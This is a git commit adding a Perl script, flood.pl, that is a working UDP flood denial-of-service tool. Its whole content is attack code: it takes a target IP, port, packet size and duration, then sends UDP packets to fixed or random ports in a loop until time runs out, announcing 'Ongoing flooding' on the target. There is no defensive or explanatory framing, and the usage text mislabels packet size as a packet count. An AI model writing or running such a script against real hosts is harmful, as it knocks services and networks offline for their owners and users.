1443c0b994cd1158585db6bcffc82423b4b1b0ab
w0keup <justdoit210@outlook.com>
2016-12-03 21:54:34 +0100

    Flood.PL
    Better script.

---
+++ flood.pl
@@ -0,0 +1,38 @@
+#!/usr/bin/perl
+ 
+##############
+# udp flood.
+##############
+ 
+use Socket;
+use strict;
+ 
+if ($#ARGV != 3) {
+  print " \n";
+  print "command: flood.pl <ip> <port> <packets> <time(in seconds)>\n";
+  print " port: the port to flood. Put 0 for all.\n";
+  print " packets: the number of packets to send. Between 64 and 1024.\n";
+  print " time: flood time in seconds.\n";
+  exit(1);
+}
+ 
+my ($ip,$port,$size,$time) = @ARGV;
+ 
+my ($iaddr,$endtime,$psize,$pport);
+ 
+$iaddr = inet_aton("$ip") or die "Could not connect to $ip\n";
+$endtime = time() + ($time ? $time : 1000000);
+ 
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+ 
+ 
+print "Ongoing flooding on $ip with port " . ($port ? $port : "random") . ", sends to " .
+  ($size ? "$size-byte" : "random size") . " packets" .
+  ($time ? " for $time seconds" : "") . "\n";
+print "Attacks stopped with Ctrl-C \ n" unless $time;
+ 
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1500-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+ 
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
